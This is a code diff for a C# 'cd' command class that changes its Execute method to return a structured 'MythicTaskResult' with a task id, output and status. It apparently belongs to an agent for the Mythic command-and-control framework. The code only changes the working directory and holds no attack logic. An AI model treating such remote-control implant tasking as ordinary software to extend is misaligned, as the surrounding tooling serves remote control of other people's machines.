@@ -12,7 +12,7 @@ namespace Tasks.Commands
     {
         public override string Name => "cd";
 
-        public override string Execute(MythicTask task)
+        public override MythicTaskResult Execute(MythicTask task)
         {
             var taskArgs = Encoding.UTF8.GetBytes(task.parameters).Deserialize<CdParam>();
 
@@ -21,16 +21,35 @@ namespace Tasks.Commands
                 taskArgs.path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             }
 
+            MythicTaskResult result;
+
             try
             {
                 Directory.SetCurrentDirectory(taskArgs.path);
+
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = Directory.GetCurrentDirectory(),
+                    completed = true,
+                    status = "success"
+                };
             }
             catch(Exception ex)
             {
-                return ex.Message;
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = ex.Message,
+                    completed = true,
+                    status = "Error",
+                    error = ex.Message
+                };
+                //return ex.Message;
             }
 
-            return Directory.GetCurrentDirectory();
+            return result;
+            //return Directory.GetCurrentDirectory();
         }
     }
 
